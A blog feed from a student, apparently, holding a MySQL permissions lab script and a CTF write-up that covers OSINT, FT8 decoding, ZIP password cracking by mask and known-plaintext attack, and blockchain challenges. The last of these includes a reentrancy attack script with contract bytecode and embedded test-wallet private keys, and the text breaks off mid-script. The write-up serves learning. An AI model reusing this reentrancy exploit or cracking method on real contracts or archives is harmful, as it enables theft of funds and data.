        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"># 实验三</span><br><span class="line"># (1)创建 CS 系的视图 CS_View</span><br><span class="line">create view CS_View</span><br><span class="line">as</span><br><span class="line">select Stu.Sno,Stu.Sname,Stu.Ssex,Stu.Sage,Stu.Sdept,Stu.Scholarship,Cno,Grade</span><br><span class="line">from Student Stu,SC</span><br><span class="line">where Stu.Sno=SC.Sno and Stu.Sdept=&#x27;CS&#x27;;</span><br><span class="line"></span><br><span class="line"># (2)在视图CS_View上查询CS系选修了1号课程的学生</span><br><span class="line">select Sno,Sname</span><br><span class="line">from CS_View</span><br><span class="line">where Cno=&#x27;1&#x27;;</span><br><span class="line"></span><br><span class="line"># (3)创建IS系成绩大于80的学生的视图IS_View</span><br><span class="line">create view IS_View</span><br><span class="line">as</span><br><span class="line">select Stu.Sno,Stu.Sname,Stu.Ssex,Stu.Sage,Stu.Sdept,Stu.Scholarship,Cno,Grade</span><br><span class="line">from Student Stu,SC</span><br><span class="line">where Stu.Sno = SC.Sno and Stu.Sdept=&#x27;IS&#x27; and Grade &gt; 80;</span><br><span class="line"></span><br><span class="line"># (4)在视图IS_View查询IS系成绩大于80的学生</span><br><span class="line">select Sno,Sname</span><br><span class="line">from IS_View</span><br><span class="line">where Grade&gt;80;</span><br><span class="line"></span><br><span class="line"># (5)删除视图IS_View</span><br><span class="line">drop view IS_View;</span><br><span class="line"></span><br><span class="line"># (6)</span><br><span class="line">select user();  # 显示当前用户</span><br><span class="line">create user &#x27;U1&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;passwdU1&#x27;;</span><br><span class="line">create user &#x27;U2&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;passwdU2&#x27;;</span><br><span class="line"></span><br><span class="line">grant select,update</span><br><span class="line">on table Student</span><br><span class="line">to &#x27;U1&#x27;@&#x27;localhost&#x27;;</span><br><span class="line"></span><br><span class="line">grant insert</span><br><span class="line">on table SC</span><br><span class="line">to &#x27;U2&#x27;@&#x27;localhost&#x27;;</span><br><span class="line"></span><br><span class="line"># 1)查询学生表的信息</span><br><span class="line">select * from student;</span><br><span class="line"></span><br><span class="line"># 2)把所有学生的年龄增加1岁，然后查询</span><br><span class="line">update Student</span><br><span class="line">set Sage = Sage+1;</span><br><span class="line">select * from Student;</span><br><span class="line"></span><br><span class="line"># 3)删除IS系的学生</span><br><span class="line">delete from Student</span><br><span class="line">where Sdept=&#x27;IS&#x27;;</span><br><span class="line"># [42000][1142] DELETE command denied to user &#x27;U1&#x27;@&#x27;localhost&#x27; for table &#x27;student&#x27;</span><br><span class="line"></span><br><span class="line"># 4)查询CS系的选课信息</span><br><span class="line">select Sno,Sname,Cname</span><br><span class="line">from Student,Course,SC</span><br><span class="line">where Student.Sno=SC.Sno and SC.Cno=Course.Cno and Sdept=&#x27;CS&#x27;;</span><br><span class="line"># [42000][1142] SELECT command denied to user &#x27;U1&#x27;@&#x27;localhost&#x27; for table &#x27;course&#x27;</span><br><span class="line"></span><br><span class="line"># 1)在SC表中插入1条记录(&#x27;200215122&#x27;,&#x27;1&#x27;,75)</span><br><span class="line">insert into SC values (&#x27;200215122&#x27;,&#x27;1&#x27;,75);</span><br><span class="line"></span><br><span class="line"># 2)查询SC表的信息</span><br><span class="line">select * from SC;</span><br><span class="line"># [42000][1142] SELECT command denied to user &#x27;U2&#x27;@&#x27;localhost&#x27; for table &#x27;sc&#x27;</span><br><span class="line"></span><br><span class="line"># 3)查询视图CS_View的信息</span><br><span class="line">select * from CS_View;</span><br><span class="line"># [42000][1142] SELECT command denied to user &#x27;U2&#x27;@&#x27;localhost&#x27; for table &#x27;cs_view&#x27;</span><br><span class="line"></span><br><span class="line"># (7)用系统管理员登录，收回U1的所有权限</span><br><span class="line">revoke select,update on table Student from &#x27;U1&#x27;@&#x27;localhost&#x27;;</span><br><span class="line"></span><br><span class="line"># (8)用U1登录，查询学生表的信息</span><br><span class="line">select * from Student;</span><br><span class="line"># 我本来以为会出现以下错误提示</span><br><span class="line"># [42000][1142] select command denied to user &#x27;U1&#x27;@&#x27;localhost&#x27; for table &#x27;student&#x27;</span><br><span class="line"># 但是实际上出现的是这样的错误提示</span><br><span class="line"># [3D000][1046] No database selected</span><br><span class="line"># 原来是因为在执行了revoke语句后，系统收回了U1在Student表上的（所有）权限后，用户U1中将不再存在数据库s_t_u202312315，故提示No database selected</span><br><span class="line"></span><br><span class="line"># (9)用系统管理员登录</span><br><span class="line"></span><br><span class="line"># (10)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hust </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF&#39;s wp</title>
      <link href="/2024/10/12/wp/"/>
      <url>/2024/10/12/wp/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="超级侦探"><a href="#超级侦探" class="headerlink" title="超级侦探"></a>超级侦探</h3><p>根据题目提示,<strong>Flag为拍摄点背后的停车场电话,flag格式为L3HSEC{}</strong><br><img src="/img/CTF/search-3.png"><br>通过google搜图，对比图片中的关键信息，查找到该位置大概位于日本某博物馆附近<br><img src="/img/CTF/search-4.jpg"><br>再通过google earth查看近景图，找到附近停车场的信息，找到flag<br><img src="/img/CTF/search-1.jpg"><br><img src="/img/CTF/search-2.png"></p><h3 id="ft8"><a href="#ft8" class="headerlink" title="ft8"></a>ft8</h3><p>题目给出一段循环播放的音频，猜测是音频内容中隐藏信息<br>根据题目<strong>WebSDR - FT8</strong>,搜索tf8了解到</p><blockquote><p>FT8是一种专为业余无线电台之间进行快速、准确通信而设计的数字协议，尤其在弱信号条件下表现出色。FT8协议只占用50Hz的带宽，可以解码人耳难以辨别的微弱信号。即使在高楼林立的社区，使用普通的手持天线也可以与欧洲等地进行通信。</p></blockquote><p><img src="/img/CTF/ft8-1.png"></p><p>再查询ft8解码的工具，使用<strong>jtdx</strong>进行解码，得到flag<br><img src="/img/CTF/ft8-2.jpg"></p><h3 id="ZipZip"><a href="#ZipZip" class="headerlink" title="ZipZip"></a>ZipZip</h3><p>通过WinRAR解压时发现提示信息<strong>L3HSEC??????L3HSEC</strong>,猜测可能为解码的口令<br><img src="/img/CTF/zipzip-1.png"><br>使用<strong>achpr</strong>工具尝试强行爆破失败后，利用<strong>L3HSEC??????L3HSEC</strong>作为掩码进行掩码攻击，<br>最后在范围为（0-9）之间时成功恢复口令<br><img src="/img/CTF/zipzip-2.png"><br>利用口令打开ZipZip压缩包，里面包含gift.zip和secret.zip两个压缩包，且都需要密钥才能解开<br>观察到两个压缩包内容相似，且secret.zip内多一个secret.txt文件，猜测flag藏于其中<br>再次尝试强行爆破secret.zip失败后，考虑到gift.zip可能有有用信息，于是对gitf.zip采用明文攻击，最终得到口令，成功打开secret.zip压缩包<br><img src="/img/CTF/zipzip-3.png"><br>观察secret.txt文件猜测为JSFuck编码<br><img src="/img/CTF/zipzip-4.png"><br>使用在线工具进行JSFuck解码，观察解码猜测为摩斯密码<br><img src="/img/CTF/zipzip-6.png"><br>使用在线工具进行摩斯密码解码后得到与flag<strong>高度相似</strong>的字符串<br><img src="/img/CTF/zipzip-5.png"><br>最后猜测 flag为<strong>L3HSEC{WOW_U@RE_FUCKING_SM4RT!}</strong></p><h3 id="你知道Blockchain嘛"><a href="#你知道Blockchain嘛" class="headerlink" title="你知道Blockchain嘛?"></a>你知道Blockchain嘛?</h3><p>搜索关键词Blockchain得到这是一道区块链的题目，参考<a href="https://www.bilibili.com/video/BV1Xe4y1e7sQ/?spm_id_from=333.337.search-card.all.click&vd_source=1046cf6b20b652e0071d6a870e3b9fdb">bilibili</a>上相关视频</p><ol><li><p>ncat 119.8.106.225 20000连接服务器<br><img src="/img/CTF/blockchain-1.png"><br>根据选项提示做出决策<br>首先选择1，题目会给出部署账户(deployer account)和标志身份的信息(token),要求向该账户转入0.001测试币</p></li><li><p>连接以太坊结点，初始化账户信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到以太坊节点</span></span><br><span class="line">infura_url = <span class="string">&quot;http://119.8.106.225:8545&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个新的账户</span></span><br><span class="line">account = Account.create()</span><br><span class="line"><span class="comment"># 打印账户地址、私钥和公钥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;地址: <span class="subst">&#123;account.address&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;私钥: <span class="subst">&#123;account.key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/CTF/blockchain-2.png"></p></li><li><p>使用生成的地址在题目提供的<strong>水龙头</strong>领取测试币<br><img src="/img/CTF/blockchain-3.png"></p></li><li><p>将自己账户的测试币转移一部分到部署账户完成交易</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行交易</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到 RPC 地址</span></span><br><span class="line">rpc_url = <span class="string">&quot;http://119.8.106.225:8545&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的测试钱包地址和私钥</span></span><br><span class="line">eth_address = <span class="string">&quot;0xd506f9E66bD092248Ea48c3709f4Db9A57AFF67e&quot;</span></span><br><span class="line">private_key = <span class="string">&quot;e899bd263df411b26cff19aec59d4df1b050d47a231c2e774b090142b6076b9c&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标部署账户（deployer account）</span></span><br><span class="line">deployer_address = <span class="string">&quot;0x6870802A4a17D1D88Dd825ED40f95bb1C9e9D33C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取链 ID</span></span><br><span class="line">chain_id = w3.eth.chain_id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建交易</span></span><br><span class="line">tx = &#123;</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(eth_address),</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: deployer_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: w3.to_wei(<span class="number">0.001</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">25000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: chain_id  <span class="comment"># 添加链 ID</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用私钥签名交易</span></span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, private_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送交易</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;交易已发送，交易哈希: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待交易确认</span></span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;交易成功！交易哈希: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/CTF/blockchain-4.png"></p></li><li><p>返回命令行，输入2，得到合约地址<br><img src="/img/CTF/blockchain-5.png"></p></li><li><p>选择4，查看<strong>contract source code</strong> ，通过python脚本向合约地址发起攻击<br><img src="/img/CTF/blockchain-7.png"><br><img src="/img/CTF/blockchain-6.png"><br>攻击成功，最后在命令行得到flag</p></li></ol><h3 id="什么-注入-真的假的"><a href="#什么-注入-真的假的" class="headerlink" title="什么?注入?真的假的"></a>什么?注入?真的假的</h3><ol><li>ncat 119.8.106.225 20001连接服务器<br><img src="/img/CTF/inject-2.png"><br>根据选项提示做出决策<br>首先选择1，题目会给出部署账户(deployer account)和标志身份的信息(token),要求向该账户转入0.001测试币</li><li>连接以太坊结点，初始化账户信息<br><img src="/img/CTF/inject-4.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到以太坊节点</span></span><br><span class="line">infura_url = <span class="string">&quot;http://119.8.106.225:8546&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个新的账户</span></span><br><span class="line">account = Account.create()</span><br><span class="line"><span class="comment"># 打印账户地址、私钥和公钥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;地址: <span class="subst">&#123;account.address&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;私钥: <span class="subst">&#123;account.key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li><li>使用生成的账户地址去水龙头领取测试币<br><img src="/img/CTF/inject-5.png"></li><li>完成交易,获取合约地址<br><img src="/img/CTF/inject-6.png"><br><img src="/img/CTF/inject-3.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行交易</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到 RPC 地址</span></span><br><span class="line">rpc_url = <span class="string">&quot;http://119.8.106.225:8546&quot;</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的测试钱包地址和私钥</span></span><br><span class="line">eth_address = <span class="string">&quot;0x9ca6A53A9b47C04dcbca625d55980D46a97Eef70&quot;</span></span><br><span class="line">private_key = <span class="string">&quot;d78192d532e5a3bde6a8bfbae6ff7f302c318a1e76a35d1bb4d7c2199cd79843&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标部署账户（deployer account）</span></span><br><span class="line">deployer_address = <span class="string">&quot;0x03CB80078a336E2e08fF48C3036Fa3FC2d7B3e2d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取链 ID</span></span><br><span class="line">chain_id = w3.eth.chain_id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建交易</span></span><br><span class="line">tx = &#123;</span><br><span class="line">    <span class="string">&#x27;nonce&#x27;</span>: w3.eth.get_transaction_count(eth_address),</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: deployer_address,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: w3.to_wei(<span class="number">0.001</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;gas&#x27;</span>: <span class="number">25000</span>,</span><br><span class="line">    <span class="string">&#x27;gasPrice&#x27;</span>: w3.to_wei(<span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: chain_id  <span class="comment"># 添加链 ID</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用私钥签名交易</span></span><br><span class="line">signed_tx = w3.eth.account.sign_transaction(tx, private_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送交易</span></span><br><span class="line">tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;交易已发送，交易哈希: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待交易确认</span></span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_hash)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;交易成功！交易哈希: <span class="subst">&#123;w3.to_hex(tx_hash)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li><li>查看合约码<br>发现withdraw 函数中存在<strong>重入攻击漏洞</strong><br>通过递归调用 withdraw 函数，反复提取资金，直到余额变为负数，并超过 1000 Ether 的检查条件，从而解锁 isSolved 状态，获取 flag。<br><img src="/img/CTF/inject.png"><br><img src="/img/CTF/inject-1.png"><br>最后在命令行返回flag</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到目标链的 RPC 地址</span></span><br><span class="line">rpc_url = <span class="string">&quot;http://119.8.106.225:8546&quot;</span>  <span class="comment"># 区块链节点的 RPC 地址</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(rpc_url))  <span class="comment"># 创建 Web3 实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查与区块链节点的连接状态</span></span><br><span class="line"><span class="keyword">if</span> w3.is_connected():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;成功连接到区块链节点&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;无法连接到区块链节点&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置用户账户地址和私钥</span></span><br><span class="line">user_address = <span class="string">&quot;0x9ca6A53A9b47C04dcbca625d55980D46a97Eef70&quot;</span>  <span class="comment"># 账户地址</span></span><br><span class="line">user_private_key = <span class="string">&quot;d78192d532e5a3bde6a8bfbae6ff7f302c318a1e76a35d1bb4d7c2199cd79843&quot;</span>  <span class="comment"># 账户私钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标合约的地址</span></span><br><span class="line">target_contract_address = <span class="string">&quot;0x36b1967D9F64A492C60D82823B2562206d4a0D06&quot;</span>  <span class="comment"># 目标合约地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击合约的 ABI</span></span><br><span class="line">attack_contract_abi = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;address&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_vulnerableAddress&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;],</span><br><span class="line">        <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;constructor&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;attack&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;payable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;owner&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;address&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;vulnerable&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;contract IVulnerable&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;withdrawFunds&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;payable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;receive&quot;</span>&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击合约的字节码（由 Solidity 编译器生成）</span></span><br><span class="line">attack_contract_bytecode = <span class="string">&quot;6080604052600436106100595760003560e01c806327e235e3146100655780632e1a7d4d146100aa57806364d98f6e146100d65780638da5cb5b146100ff57806393aef87114610130578063b6b55f251461014557610060565b3661006057005b600080fd5b34801561007157600080fd5b506100986004803603602081101561008857600080fd5b50356001600160a01b031661016f565b60408051918252519081900360200190f35b3480156100b657600080fd5b506100d4600480360360208110156100cd57600080fd5b5035610181565b005b3480156100e257600080fd5b506100eb61021b565b604080519115158252519081900360200190f35b34801561010b57600080fd5b5061011461022b565b604080516001600160a01b039092168252519081900360200190f35b34801561013c57600080fd5b506100d461023a565b34801561015157600080fd5b506100d46004803603602081101561016857600080fd5b5035610270565b60006020819052908152604090205481565b336000908152602081905260409020548111156101d4576040805162461bcd60e51b815260206004820152600c60248201526be4bd99e9a29de4b88de8b6b360a01b604482015290519081900360640190fd5b604051339082156108fc029083906000818181858888f19350505050158015610201573d6000803e3d6000fd5b503360009081526020819052604090208054919091039055565b600154600160a01b900460ff1681565b6001546001600160a01b031681565b33600090815260208190526040902054683635c9adc5dea00000101561026e576001805460ff60a01b1916600160a01b1790555b565b3360009081526020819052604090208054909101905556fea2646970667358221220c0b48d8f73c81a21de90501da0815e6b9d921851377155170123a89c550ad10e64736f6c634300060c0033&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标合约的 ABI（用于检查是否成功解决挑战）</span></span><br><span class="line">target_contract_abi = [</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;constructor&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;inputs&quot;</span>: [], <span class="string">&quot;name&quot;</span>: <span class="string">&quot;isSolved&quot;</span>, <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;internalType&quot;</span>: <span class="string">&quot;bool&quot;</span>, <span 